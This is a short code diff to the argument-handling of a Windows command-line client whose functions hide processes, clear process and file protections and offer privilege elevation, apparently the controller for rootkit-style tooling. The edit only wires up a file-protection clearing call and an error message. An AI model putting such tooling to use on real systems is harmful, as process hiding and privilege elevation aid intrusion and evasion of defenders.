@@ -92,9 +92,9 @@ int wmain(int argc, const wchar_t* argv[]) {
 		if (_wcsicmp(argv[1], L"process") == 0)
 			success = NidhoggProcessClearAllProtection();
 		else if (_wcsicmp(argv[1], L"file") == 0) {
-			std::cout << "TBA" << std::endl;
+			success = NidhoggFileClearAllProtection();
 		}
-		
+
 		break;
 	}
 	case Options::Hide:
@@ -104,9 +104,11 @@ int wmain(int argc, const wchar_t* argv[]) {
 			success = NidhoggProcessHide(pids);
 		}
 		else if (_wcsicmp(argv[1], L"file") == 0) {
-			std::cout << "TBA" << std::endl;
+			std::cerr << "[ - ] Invalid option!" << std::endl;
+			PrintUsage();
+			return 1;
 		}
-		
+
 		break;
 	}
 	case Options::Elevate:
